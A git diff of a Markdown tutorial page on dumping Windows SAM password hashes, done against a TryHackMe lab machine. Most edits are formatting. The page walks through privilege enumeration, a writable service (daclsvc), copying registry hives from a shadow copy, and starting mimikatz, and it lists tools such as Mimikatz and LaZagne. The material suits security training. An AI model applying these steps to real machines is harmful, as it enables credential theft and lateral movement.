@@ -1,14 +1,14 @@
 ---
 layout: default
 title:  "SAM Dumping"
-weight: 2
+weight: 3
 type: docs
 ---
 
-### 1️⃣ Introduction   
+## Introduction   
 - Dumping SAM (Security Account Manager) passwords means extracting hashed credentials from the Windows SAM database. Attackers do this to perform offline cracking or lateral movement in a network.   
    
-### 2️⃣ Description   
+## Description   
 - SAM stores hashed passwords of local user accounts.   
 - Hashes are usually in **NTLM** or **LM** format.   
 - The SAM file is locked by the system, so direct access is restricted.   
@@ -19,7 +19,7 @@ type: docs
 |:------|:------------------------------------------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
 | Tools | 1.PwDump7 2.SamDump2 3.Metasploit Framework 5.Invoke-PowerDump.ps1 6.Get-PassHashes.ps1 7.PowerShell 8.Powerdump Manual | 1.Mimikatz 2.Impacket 3.Metasploit Framework     a.HashDump     b.Credential\_collector     c.Load\_kiwi (Mimikatz) 4.Koadic 5.PowerShell Empire     a.Mimikatz/sam 7.LaZagne 8.CrackMapExec |
 
-#We will see each tools one by one in detail as we move ahead.    
+We will see each tools one by one in detail as we move ahead.    
    
 I have chose a target a tryhackme vulnerable machine we will try on that, As discussed dumping SAM creds require a access to windows machine or at least low privileged account.   
    
@@ -27,7 +27,7 @@ Hear we have one with username:user and password:password321, As we login we nee
    
 There are various ways to get the privileg info we will look at most common way.   
    
-### #whoami /all Summary   
+## whoami /all Summary   
    
 ```
 C:\Users\user> whoami /all
@@ -69,20 +69,23 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
 ```
    
-**#The "whoami /all" command. Lists the current user along with group memberships and privileges.**   
+The "whoami /all" command. Lists the current user along with group memberships and privileges.   
 **Username**: user (Standard User)   
 **SID**: Unique identifier for the account   
+
 **Group Memberships:**   
-  - Part of **BUILTIN\Users** (Standard users)   
-  - **NOT** in Administrators (Limited privileges)   
-**Privilege Level: Medium (Cannot run admin tasks)**   
-**Key Privileges:**   
-  - **SeChangeNotifyPrivilege** → Enabled (Basic file access)   
-  - **SeShutdownPrivilege & SeIncreaseWorkingSetPrivilege** → Disabled   
-  - **No SeDebugPrivilege, SeBackupPrivilege** → **Cannot dump SAM**
+  - Part of BUILTIN\Users (Standard users)   
+  - NOT in Administrators (Limited privileges)   
+  
+**Privilege Level**: Medium (Cannot run admin tasks)
+ 
+- **Key Privileges:**
+  - SeChangeNotifyPrivilege → Enabled (Basic file access)   
+  - SeShutdownPrivilege & SeIncreaseWorkingSetPrivilege** → Disabled   
+  - No SeDebugPrivilege, SeBackupPrivilege → Cannot dump SAM
    
    
-### #net localgroup Adminstrators Summary   
+## net localgroup Adminstrators Summary   
    
 ```
 C:\Users\user>net localgroup Administrators
@@ -104,7 +107,7 @@ The command completed successfully.
 Your account ( **`user`) is NOT listed**, meaning you **do not have admin rights**.   
 **To perform admin tasks, you need to use one of the listed admin accounts or escalate privileges.**   
    
-### **#net session**   
+## net session   
    
 ```
 PS C:\Users\user> net session
@@ -117,7 +120,7 @@ The `net session` command **displays active network sessions** connected to the 
    
 If we get the output after running the command we have admin privileges but now we don't have so lets move ahead.   
    
-### #Using [accesschk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to find vulnerable services   
+## Using [accesschk.exe] to find vulnerable services   
    
 ```
 C:\PrivEsc>accesschk.exe -wcuv "user" *
@@ -137,7 +140,7 @@ RW daclsvc
         READ_CONTROL
 ```
    
-Now when we run the accesschk.exe command we get a service call "daclsvc" with read and write access, lets go further ahead and get more info on that service.   
+Now when we have ran the accesschk.exe we get output which is a service call "daclsvc" with read and write access, let's go further ahead and get more info on that service.   
    
 ```
 C:\PrivEsc>sc qc daclsvc
@@ -209,7 +212,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SEC
 
 ```
    
-After copying the files we can use mimikazha to dump those NTML hash as shown below.   
+After copying the files we can use mimikatz to dump those NTML hash as shown below.   
    
 ```
 C:\PrivEsc>mi.exe
